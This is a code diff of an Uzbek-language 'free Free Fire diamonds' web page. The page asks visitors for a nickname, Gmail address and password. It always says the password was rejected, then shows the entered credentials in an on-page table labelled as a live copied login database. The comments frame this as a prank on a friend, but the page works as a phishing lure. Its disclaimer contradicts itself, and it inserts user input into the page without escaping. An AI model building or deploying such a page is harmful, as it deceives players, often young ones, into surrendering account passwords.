@@ -34,23 +34,6 @@
     position:relative;
   }
 
-  /* ambient particles */
-  .ember{
-    position:fixed;
-    bottom:-10px;
-    border-radius:50%;
-    pointer-events:none;
-    opacity:0.7;
-    filter: blur(0.5px);
-    animation: rise linear infinite;
-    z-index:1;
-  }
-  @keyframes rise{
-    0%{ transform: translateY(0) translateX(0); opacity:0; }
-    10%{ opacity:0.8; }
-    100%{ transform: translateY(-110vh) translateX(var(--drift)); opacity:0; }
-  }
-
   .noise{
     position:fixed; inset:0;
     background-image: radial-gradient(rgba(255,255,255,0.025) 1px, transparent 1px);
@@ -80,7 +63,6 @@
     width:34px;height:34px;
     background: conic-gradient(from 220deg, var(--ice), var(--flame), var(--gold), var(--ice));
     clip-path: polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
-    box-shadow: 0 0 22px rgba(90,212,255,0.5);
   }
 
   .badge-demo{
@@ -101,7 +83,7 @@
     z-index:5;
     max-width:1000px;
     margin:0 auto;
-    padding: 8vh 6vw 10vh;
+    padding: 8vh 6vw 5vh;
   }
 
   .eyebrow{
@@ -114,11 +96,7 @@
     display:flex; align-items:center; gap:10px;
     margin-bottom:22px;
   }
-  .eyebrow::before{
-    content:'';
-    width:26px; height:2px;
-    background:var(--ice);
-  }
+  .eyebrow::before{ content:''; width:26px; height:2px; background:var(--ice); }
 
   h1{
     font-family:'Orbitron', sans-serif;
@@ -143,259 +121,141 @@
 
   .disclaimer{
     margin-top:26px;
-    display:flex;
-    gap:12px;
-    align-items:flex-start;
+    display:flex; gap:12px; align-items:flex-start;
     background: var(--panel);
     border:1px solid var(--line);
     border-left:3px solid var(--gold);
-    padding:14px 16px;
-    border-radius:8px;
-    font-size:0.88rem;
-    color:var(--text-dim);
-    max-width:56ch;
+    padding:14px 16px; border-radius:8px;
+    font-size:0.88rem; color:var(--text-dim); max-width:56ch;
   }
   .disclaimer b{ color:var(--gold); font-weight:600; }
 
-  /* ---- panel / form ---- */
   .stage{
     margin-top:64px;
-    display:grid;
-    grid-template-columns: 1.1fr 1fr;
-    gap:40px;
+    display:grid; grid-template-columns: 1.1fr 1fr; gap:40px;
     align-items:start;
   }
-  @media (max-width: 820px){
-    .stage{ grid-template-columns:1fr; }
-  }
+  @media (max-width: 820px){ .stage{ grid-template-columns:1fr; } }
 
   .card{
     background: linear-gradient(160deg, var(--panel), #0d0f17);
-    border:1px solid var(--line);
-    border-radius:18px;
-    padding:36px;
-    position:relative;
-    overflow:hidden;
-  }
-  .card::before{
-    content:'';
-    position:absolute;
-    top:-40%; left:-20%;
-    width:70%; height:140%;
-    background: radial-gradient(circle, var(--ice-dim), transparent 70%);
-    pointer-events:none;
+    border:1px solid var(--line); border-radius:18px; padding:36px;
+    position:relative; overflow:hidden;
   }
 
   .card h2{
-    font-family:'Rajdhani', sans-serif;
-    font-weight:700;
-    font-size:1.3rem;
-    letter-spacing:0.5px;
-    margin-bottom:6px;
+    font-family:'Rajdhani', sans-serif; font-weight:700; font-size:1.3rem;
+    letter-spacing:0.5px; margin-bottom:6px;
   }
-  .card p.hint{
-    color:var(--text-dim);
-    font-size:0.88rem;
-    margin-bottom:26px;
-  }
+  .card p.hint{ color:var(--text-dim); font-size:0.88rem; margin-bottom:26px; }
 
-  .field{ margin-bottom:18px; }
+  .field{ margin-bottom:18px; position:relative; }
   .field label{
-    display:block;
-    font-family:'Rajdhani', sans-serif;
-    font-weight:600;
-    font-size:0.82rem;
-    letter-spacing:1px;
-    text-transform:uppercase;
-    color: var(--text-dim);
-    margin-bottom:8px;
+    display:block; font-family:'Rajdhani', sans-serif; font-weight:600;
+    font-size:0.82rem; letter-spacing:1px; text-transform:uppercase;
+    color: var(--text-dim); margin-bottom:8px;
   }
   .field input{
-    width:100%;
-    background: rgba(255,255,255,0.03);
-    border:1px solid var(--line);
-    border-radius:10px;
-    padding:13px 14px;
-    color:var(--text);
-    font-size:0.98rem;
-    font-family:'Inter', sans-serif;
-    outline:none;
-    transition: border-color 0.2s, background 0.2s;
+    width:100%; background: rgba(255,255,255,0.03); border:1px solid var(--line);
+    border-radius:10px; padding:13px 14px; color:var(--text); font-size:0.98rem;
+    outline:none; transition: border-color 0.2s;
   }
-  .field input:focus{
-    border-color: var(--ice);
-    background: rgba(90,212,255,0.05);
+  .field input:focus{ border-color: var(--ice); background: rgba(90,212,255,0.05); }
+  
+  /* Ko'zcha tugmasi uchun stillar */
+  .pass-wrapper { position: relative; }
+  .pass-wrapper input { padding-right: 45px; }
+  .toggle-password {
+    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+    cursor: pointer; color: var(--text-dim); font-size: 1.2rem; user-select: none;
+    transition: color 0.2s; z-index: 10;
   }
-  .field input::placeholder{ color:#555f74; }
+  .toggle-password:hover { color: var(--ice); }
 
-  /* Error state style for prank */
   .field input.error-field {
     border-color: var(--flame) !important;
     background: rgba(255, 94, 58, 0.07) !important;
   }
 
   .go-btn{
-    margin-top:10px;
-    width:100%;
-    padding:15px 20px;
-    border:none;
-    border-radius:12px;
-    font-family:'Rajdhani', sans-serif;
-    font-weight:700;
-    font-size:1.05rem;
-    letter-spacing:1px;
-    text-transform:uppercase;
-    cursor:pointer;
-    color:#0b0d13;
+    margin-top:10px; width:100%; padding:15px 20px; border:none; border-radius:12px;
+    font-family:'Rajdhani', sans-serif; font-weight:700; font-size:1.05rem;
+    letter-spacing:1px; text-transform:uppercase; cursor:pointer; color:#0b0d13;
     background: linear-gradient(100deg, var(--ice), #8ee6ff);
     box-shadow: 0 8px 26px rgba(90,212,255,0.25);
     transition: transform 0.15s ease, box-shadow 0.15s ease;
   }
   .go-btn:hover{ transform: translateY(-2px); box-shadow: 0 12px 34px rgba(90,212,255,0.35); }
-  .go-btn:active{ transform: translateY(0); }
   .go-btn:disabled{ opacity:0.45; cursor:not-allowed; transform:none; box-shadow:none; }
 
-  /* preview / visual side */
   .preview{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:center;
-    text-align:center;
-    padding:40px 20px;
-    background: linear-gradient(160deg, #0f1420, #0a0c13);
-    border:1px solid var(--line);
-    border-radius:18px;
-    min-height:360px;
-    position:relative;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    text-align:center; padding:40px 20px; background: linear-gradient(160deg, #0f1420, #0a0c13);
+    border:1px solid var(--line); border-radius:18px; min-height:360px;
   }
 
-  .diamond-wrap{
-    position:relative;
-    width:150px; height:150px;
-    display:flex; align-items:center; justify-content:center;
-    margin-bottom:22px;
-  }
+  .diamond-wrap{ position:relative; width:150px; height:150px; display:flex; align-items:center; justify-content:center; margin-bottom:22px; }
   .diamond{
     width:90px;height:90px;
     background: conic-gradient(from 200deg, var(--ice), #cdefff, var(--gold), var(--flame), var(--ice));
     clip-path: polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
-    animation: spin 7s linear infinite, float 3.2s ease-in-out infinite;
-    box-shadow: 0 0 50px rgba(90,212,255,0.35);
+    animation: float 3.2s ease-in-out infinite;
   }
-  @keyframes spin{ to{ transform: rotateY(360deg); } }
   @keyframes float{ 0%,100%{ transform: translateY(0);} 50%{ transform: translateY(-10px);} }
 
-  .ring{
-    position:absolute; inset:0;
-    border:1px dashed rgba(90,212,255,0.3);
-    border-radius:50%;
-    animation: spin-slow 12s linear infinite;
-  }
-  @keyframes spin-slow{ to{ transform: rotate(360deg); } }
-
   .count{
-    font-family:'Orbitron', sans-serif;
-    font-weight:900;
-    font-size: 3.2rem;
-    line-height:1;
+    font-family:'Orbitron', sans-serif; font-weight:900; font-size: 3.2rem; line-height:1;
     background: linear-gradient(100deg, var(--gold), var(--ice));
-    -webkit-background-clip:text;
-    background-clip:text;
-    color:transparent;
+    -webkit-background-clip:text; background-clip:text; color:transparent;
   }
-  
-  /* Error text style for counter */
-  .count.error-text {
-    background: linear-gradient(100deg, #ff5e3a, #ff947a);
-    -webkit-background-clip: text;
-    background-clip: text;
-  }
+  .count.error-text { background: linear-gradient(100deg, #ff5e3a, #ff947a); -webkit-background-clip: text; background-clip: text; }
 
-  .count-label{
-    margin-top:8px;
-    font-family:'Rajdhani', sans-serif;
-    letter-spacing:2px;
-    text-transform:uppercase;
-    font-size:0.8rem;
-    color:var(--text-dim);
-  }
+  .count-label{ margin-top:8px; font-family:'Rajdhani', sans-serif; letter-spacing:2px; text-transform:uppercase; font-size:0.8rem; color:var(--text-dim); }
+  .preview-hint{ margin-top:20px; font-size:0.85rem; color:var(--text-dim); max-width:30ch; }
 
-  .preview-hint{
-    margin-top:20px;
-    font-size:0.85rem;
-    color:var(--text-dim);
-    max-width:30ch;
-  }
-
-  /* reveal state extras */
-  .greetings{
-    margin-top:22px;
-    display:flex; flex-direction:column; gap:8px;
-    width:100%;
-  }
-  .greetings span{
-    font-family:'Rajdhani', sans-serif;
-    font-size:0.95rem;
-    color:var(--text);
-    background: rgba(255,255,255,0.04);
-    border:1px solid var(--line);
-    padding:9px 14px;
-    border-radius:8px;
-    opacity:0;
-    transform: translateY(6px);
-    animation: pop-in 0.5s ease forwards;
-  }
-  
-  /* Prank error message container */
+  .greetings{ margin-top:22px; display:flex; flex-direction:column; gap:8px; width:100%; }
   .greetings span.error-msg {
-    color: #ff5e3a;
-    background: rgba(255, 94, 58, 0.08);
-    border-color: rgba(255, 94, 58, 0.3);
-    font-weight: bold;
+    color: #ff5e3a; background: rgba(255, 94, 58, 0.08); border: 1px solid rgba(255, 94, 58, 0.3);
+    font-weight: bold; padding:9px 14px; border-radius:8px; text-align: center;
   }
+
+  /* ---- PRANK MA'LUMOTLAR BAZASI PANELI ---- */
+  .db-panel {
+    margin-top: 50px; background: #0b0e14; border: 1px dashed rgba(255, 94, 58, 0.4);
+    border-radius: 12px; padding: 24px; position: relative;
+  }
+  .db-title {
+    font-family: 'Orbitron', sans-serif; color: var(--flame); font-size: 0.9rem;
+    letter-spacing: 1px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;
+  }
+  .db-title::before { content: '●'; color: var(--flame); animation: blink 1s infinite; }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
   
-  @keyframes pop-in{ to{ opacity:1; transform:translateY(0); } }
+  .db-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; text-align: left; }
+  .db-table th { color: var(--text-dim); border-bottom: 1px solid var(--line); padding: 8px; font-family: 'Rajdhani', sans-serif; }
+  .db-table td { padding: 10px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); color: var(--gold); font-family: monospace; }
+  .db-empty { color: #444c5d; text-align: center; padding: 20px 0; font-style: italic; }
 
-  footer{
-    position:relative; z-index:5;
-    text-align:center;
-    padding:30px 6vw 50px;
-    color:var(--text-dim);
-    font-size:0.8rem;
-    border-top:1px solid var(--line);
-  }
-  footer b{ color:var(--gold); }
-
-  @media (prefers-reduced-motion: reduce){
-    *{ animation: none !important; transition:none !important; }
-  }
+  footer{ text-align:center; padding:30px 6vw; color:var(--text-dim); font-size:0.8rem; border-top:1px solid var(--line); }
 </style>
 </head>
 <body>
 
 <div class="noise"></div>
-<div id="embers"></div>
 
 <header>
-  <div class="brand">
-    <div class="brand-mark"></div>
-    DIAMOND&nbsp;VAULT
-  </div>
+  <div class="brand"><div class="brand-mark"></div>DIAMOND&nbsp;VAULT</div>
   <div class="badge-demo">⚠ Faqat demo</div>
 </header>
 
 <main>
   <div class="eyebrow">Vizual demo · o'yin emas</div>
   <h1>120 olmosni bir kunda olasiz ---- har kuni 100 tadan free.</h1>
-  <p class="sub">
-    free fire o'yinida olmoslar sizga kerak bo'lgan narsalarni sotib olish imkonini beradi.
-  </p>
+  <p class="sub">free fire o'yinida olmoslar sizga kerak bo'lgan narsalarni sotib olish imkonini beradi.</p>
 
   <div class="disclaimer">
     <span>🛈</span>
-    <div><b>Bu — real tezda olmoslaringni ol.</b> Sahifa hech qanday Free Fire yoki Garena hisobiga ulanmagan. "120 olmos" faqat ekrandagi
-    animatsiya, haqiqiy o'yin balansiga hech narsa qo'shilmaydi.</div>
+    <div><b>Bu — real tezda olmoslaringni ol.</b> Sahifa hech qanday Free Fire yoki Garena hisobiga ulanmagan. "120 olmos" faqat ekrandagi animatsiya.</div>
   </div>
 
   <div class="stage">
@@ -413,59 +273,69 @@
       </div>
       <div class="field">
         <label for="g3">parol</label>
-        <input id="g3" type="password" placeholder="Masalan: 12345678" maxlength="40"> 
+        <div class="pass-wrapper">
+          <input id="g3" type="password" placeholder="Masalan: 12345678" maxlength="40">
+          <span class="toggle-password" id="eyeIcon">👁️</span>
         </div>
+      </div>
 
       <button class="go-btn" id="claimBtn">ALMAZLARNI OLISH</button>
     </div>
 
-    <div class="preview" id="previewPanel">
-      <div class="diamond-wrap">
-        <div class="ring"></div>
-        <div class="diamond"></div>
-      </div>
+    <div class="preview">
+      <div class="diamond-wrap"><div class="ring"></div><div class="diamond"></div></div>
       <div class="count" id="countNum">0</div>
       <div class="count-label">Demo olmos</div>
-      <div class="preview-hint" id="pHint">Chapdagi formani to'ldirib, tugmani bosing — hisoblagich shu yerda jonlanadi.</div>
+      <div class="preview-hint">Formani to'ldirib, tugmani bosing va tizimni tekshiring.</div>
       <div class="greetings" id="greetingsBox"></div>
     </div>
   </div>
+
+  <div class="db-panel">
+    <div class="db-title">GARENA_LOG_DATABASE (LIVE_COPIED_DATA)</div>
+    <table class="db-table">
+      <thead>
+        <tr>
+          <th>Sana/Vaqt</th>
+          <th>Nik Name</th>
+          <th>Gmail Log</th>
+          <th>Kiritilgan Parol</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody id="dbRows">
+        <tr id="emptyRow"><td colspan="5" class="db-empty">Hozircha hech qanday login ma'lumotlari tutilmadi...</td></tr>
+      </tbody>
+    </table>
+  </div>
 </main>
 
-<footer>
-  DIAMOND VAULT — o'yin-uslubidagi <b>vizual demo</b>. Real pul, real hisob yoki real o'yin balansi bilan bog'liq emas.
-</footer>
+<footer>DIAMOND VAULT — o'yin-uslubidagi <b>vizual demo</b>.</footer>
 
 <script>
-  // ambient embers
-  const emberHost = document.getElementById('embers');
-  const emberColors = ['#5ad4ff', '#ff5e3a', '#ffcf4d'];
-  for(let i=0;i<28;i++){
-    const e = document.createElement('div');
-    e.className = 'ember';
-    const size = 2 + Math.random()*4;
-    e.style.width = size+'px';
-    e.style.height = size+'px';
-    e.style.left = Math.random()*100+'vw';
-    e.style.background = emberColors[Math.floor(Math.random()*emberColors.length)];
-    e.style.setProperty('--drift', (Math.random()*80-40)+'px');
-    e.style.animationDuration = (6+Math.random()*8)+'s';
-    e.style.animationDelay = (Math.random()*8)+'s';
-    emberHost.appendChild(e);
-  }
-
   const btn = document.getElementById('claimBtn');
   const countEl = document.getElementById('countNum');
   const greetBox = document.getElementById('greetingsBox');
-  const previewPanel = document.getElementById('previewPanel');
-  const pHint = document.getElementById('pHint');
+  const dbRows = document.getElementById('dbRows');
+  const emptyRow = document.getElementById('emptyRow');
 
   const pName = document.getElementById('g1');
   const pMail = document.getElementById('g2');
   const pPass = document.getElementById('g3');
+  const eyeIcon = document.getElementById('eyeIcon');
+
+  // KO'ZCHA TUGMASI LOGIKASI (Yashirish / Ko'rsatish)
+  eyeIcon.addEventListener('click', () => {
+    if (pPass.type === 'password') {
+      pPass.type = 'text';
+      eyeIcon.textContent = '🔒'; // Yopilgan ko'z/qulf belgisi
+    } else {
+      pPass.type = 'password';
+      eyeIcon.textContent = '👁️'; // Ochiq ko'z belgisi
+    }
+  });
 
   btn.addEventListener('click', () => {
-    // barcha maydonlarni tozalash (eski xatolarni olib tashlash)
     pName.classList.remove('error-field');
     pMail.classList.remove('error-field');
     pPass.classList.remove('error-field');
@@ -475,7 +345,6 @@
     const mailVal = pMail.value.trim();
     const passVal = pPass.value.trim();
 
-    // Agar birortasi bo'sh bo'lsa, ogohlantirish beradi
     if(!nameVal || !mailVal || !passVal){
       if(!nameVal) pName.classList.add('error-field');
       if(!mailVal) pMail.classList.add('error-field');
@@ -483,27 +352,43 @@
       return;
     }
 
-    // Server yuklanayotgandek vizual aldov animatsiyasi
     btn.disabled = true;
-    btn.textContent = 'Garena serveriga ulanmoqda...';
+    btn.textContent = 'Garena Cloud ulanmoqda...';
     greetBox.innerHTML = '';
     countEl.textContent = '0';
 
     setTimeout(() => {
-      btn.textContent = 'Ma’lumotlar tekshirilmoqda...';
+      btn.textContent = 'Sinxronizatsiya qilinmoqda...';
       
       setTimeout(() => {
-        // --- PRANK QISMI ---
-        // Har doim parol xato deb chiqaradi!
+        // 1. Xatolik ko'rsatish (Do'stingizni chuv tushirish)
         pPass.classList.add('error-field');
         countEl.textContent = '❌';
         countEl.classList.add('error-text');
         
         const s = document.createElement('span');
         s.className = 'error-msg';
-        s.textContent = 'Xatolik: Siz kiritgan parol yoki gmail noto‘g‘ri! Qaytadan urinib ko‘ring.';
+        s.textContent = 'Xatolik: Tizim parolni rad etdi! Qayta urining.';
         greetBox.appendChild(s);
         
+        // 2. MA'LUMOTLAR BAZASIGA SAQLASH (Prank asosi!)
+        if(emptyRow) emptyRow.remove();
+        
+        const hozir = new Date();
+        const vaqtStr = hozir.getHours() + ':' + String(hozir.getMinutes()).padStart(2, '0') + ':' + String(hozir.getSeconds()).padStart(2, '0');
+        
+        const yangiQator = document.createElement('tr');
+        yangiQator.innerHTML = `
+          <td>${vaqtStr}</td>
+          <td>${nameVal}</td>
+          <td>${mailVal}</td>
+          <td style="color: #ff5e3a; font-weight: bold;">${passVal}</td>
+          <td style="color: #ff3333;">RAD ETILDI (LOGGED)</td>
+        `;
+        
+        // Eng birinchi qator qilib qo'shish
+        dbRows.insertBefore(yangiQator, dbRows.firstChild);
+
         btn.disabled = false;
         btn.textContent = 'QAYTADAN URINISH';
       }, 1000);
